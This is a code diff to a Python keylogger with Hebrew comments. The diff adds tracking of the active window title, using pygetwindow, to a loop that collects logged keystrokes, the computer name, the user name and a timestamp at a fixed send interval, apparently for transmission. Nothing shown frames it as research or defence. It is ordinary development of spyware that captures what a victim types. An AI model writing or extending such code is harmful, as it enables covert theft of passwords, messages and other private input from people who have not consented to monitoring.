@@ -3,9 +3,23 @@ import time
 import os
 import socket
 import time
+import time
+import os
+import socket
+import psutil
+import pygetwindow as gw
+
 
 # הגדרת תדירות השליחה (בשניות)
-Send_time = 60  # ניתן לשנות לפי הצורך
+SEND_INTERVAL = 60  # ניתן לשנות לפי הצורך
+
+def get_active_window():
+    """מחזיר את שם האפליקציה הפעילה (אם אפשר)"""
+    try:
+        active_window = gw.getActiveWindow()
+        return active_window.title if active_window else "Unknown App"
+    except Exception:
+        return "Unknown App"
 
 def main():
     # יצירת אובייקטים
@@ -25,10 +39,13 @@ def main():
 
     try:
         while True:
-            time.sleep(Send_time)  # מחכה לפי ההגדרה
+            time.sleep(SEND_INTERVAL)  # מחכה לפי ההגדרה
             
             # חותמת זמן
             timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+            
+            # קבלת שם האפליקציה הפעילה
+            active_app = get_active_window()
             
             # איסוף הנתונים שנאספו
             logged_keys = key_logger.get_logged_keys()
@@ -39,6 +56,7 @@ def main():
                 "timestamp": timestamp,
                 "computer_name": computer_name,
                 "user_name": user_name,
+                "active_app": active_app,  # הוספת האפליקציה הפעילה
                 "keys": key_data
             }
 
